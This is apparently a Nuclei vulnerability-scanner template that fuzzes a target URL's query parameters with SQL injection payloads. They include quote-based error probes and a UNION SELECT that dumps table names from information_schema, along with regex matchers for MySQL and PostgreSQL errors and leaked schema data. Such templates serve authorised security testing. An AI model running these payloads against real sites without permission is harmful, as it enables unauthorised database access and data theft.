id: nawab-smart-sqli-scanner

info:
  name: 💀 Nawab-Smart-SQLi-Scanner 💀
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      sqli_error:
        - "'"
        - "\""
        - "'; SELECT 1--"
      sqli_extract:
        - "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{sqli_error}}"
          - "{{sqli_extract}}"

    matchers-condition: or
    matchers:
      - type: regex
        name: "🔥🔥 [FOUND] SQL-ERROR: DATABASE-EXPOSED 🔥🔥"
        regex:
          - "SQL syntax.*MySQL"
          - "PostgreSQL.*ERROR"
        part: body

      - type: regex
        name: "🔥🔥 [FOUND] SQL-SUCCESS: DATA-LEAKED 🔥🔥"
        regex:
          - "(?i)(information_schema|table_name|column_name)"
        part: body
